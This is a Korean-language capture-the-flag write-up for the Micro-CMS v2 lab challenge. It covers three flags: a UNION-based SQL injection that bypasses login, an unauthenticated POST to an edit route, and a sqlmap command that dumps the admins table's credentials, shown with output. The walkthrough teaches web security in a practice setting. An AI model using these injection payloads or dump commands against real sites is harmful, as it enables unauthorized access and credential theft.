# Micro-CMS v2

## Flag0

첫번째 Flag는 간단하게 SQL Injection 취약점을 이용하여, 로그인하여 알아낼 수 있습니다.

### 0x00 Try SQLi

`Create a new page` 링크를 눌러, 로그인 페이지로 이동하여아합니다.
다음, Username에 `'`(single quote)을 넣어 SQLi 를 시도해봅니다.
그러면 다음과 같은 Traceback 메세지를 만나볼 수 있습니다.

```py
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```

그러면 다음과 같이 SQL문 구조를 볼 수 있습니다.

### 0x01 Login

Form에 다음과 같이 작성해줍니다.

Username: `' UNION SELECT 'coolwonder' AS password#`
Password: `coolwonder`

### 0x02 View Page

글 리스트에서 가장 수상하게 생긴 `Private Page`를 클린한다.


## Flag1
### 0x00 Stay Logout

먼저 로그아웃 되어있어야한다.

### 0x01 Edit Page

수정 라우트를 만져보다 발견되었다.

**POST** `http://ctf/xxxxxxx/page/edit/1`
위와 같이 HTTP 요청을 보내시면 Flag값을 반환한다.

## Flag2

### 0x00 sqlmap

```sh
python sqlmap.py -u "http://35.227.24.107/4be86410fc/login" --data "username=admin&password=admin" --regexp "Invalid password" --dump
```

반환:
```sh
Database: level2
Table: admins
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | kizzie   | sharlene |
+----+----------+----------+
```

### 0x01 Login

반환되는 유저네임과 비밀번호를 이용하여 로그인하면 마지막 Flag를 확인할 수 있다.
